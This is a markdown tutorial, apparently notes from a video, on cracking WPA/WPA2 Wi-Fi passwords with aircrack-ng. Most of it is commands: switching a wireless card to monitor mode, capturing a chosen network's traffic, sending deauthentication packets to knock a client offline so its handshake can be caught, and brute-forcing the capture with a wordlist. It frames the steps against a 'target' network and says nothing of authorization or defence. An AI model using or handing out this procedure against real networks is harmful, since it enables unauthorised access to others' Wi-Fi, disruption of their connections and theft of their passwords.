# WPA/WPA2 Wifi Password Hack w/ Aircrack-ng

## Sources : 
- https://www.youtube.com/watch?v=zAWcu3NQLME&list=PL7WXNOcf6zc0V5rydTqW6Qymm6lnrt33T&index=2

## Online part

- display network interfaces availables on the machine (common names : wlan0 / wlo1 ...) :
```
iwconfig
```
- display more details about the interface :
```
ifconfig [interface name]
```
- display availables wireless interfaces :
```
airmon-ng
```

`We now want to change the "Managed Mode" into "Monitor Mode" for the purpose of packets capture`

- change our wireless card mode :
```
airmon-ng start [interface name]
```
- check if the mode change worked, the interface name should now end with "mon" :
```
iwconfig
```
- grabbing packets on this interface (channel hopping) :
```
airodump-ng [new interface name]
```

`We have now multiple lines showing availables Wi-Fi in the area, with many informations, we can stop the command when the target appears`

`Keep the terminal open with the informations, we need the BSSID and the channel "CH"`

- Use Airodump to monitor only the target Wi-Fi network :
```
airodump-ng -c [channel number] -d [target BSSID] -w capture [interface name]
```

`We now need to choose one of the clients of the targeted Wi-Fi (know as stations in the terminal) and knock its connection down so that when he try to reconnect, we intercept the WPA handshake to perfom an offline dictionnary attack`

`(do not stop the previous command since it's displaying a msg when the following commands gets what we want -> capture WPA handshake)`


- knock one of the clients connection down :
```
aireplay-ng --deauth 0 -a [router BSSID] -c [client BSSID] [monitor interface]
```

`Wait until the WPA handshake or the PMKID appears on the airodump command then stop the two`

`You have now the capture files`

- make sure you switch your interface back in managed mode : :
```
airmon-ng stop [interface name]
```

## Offline part

- Brute force attack on the capture file :
```
aircrack-ng [captureFile.cap] -w [wordlist]
```

## Some wordlists availables :
- https://hackntricks.fr/4-wordlists-pour-brute-force-un-mot-de-passe/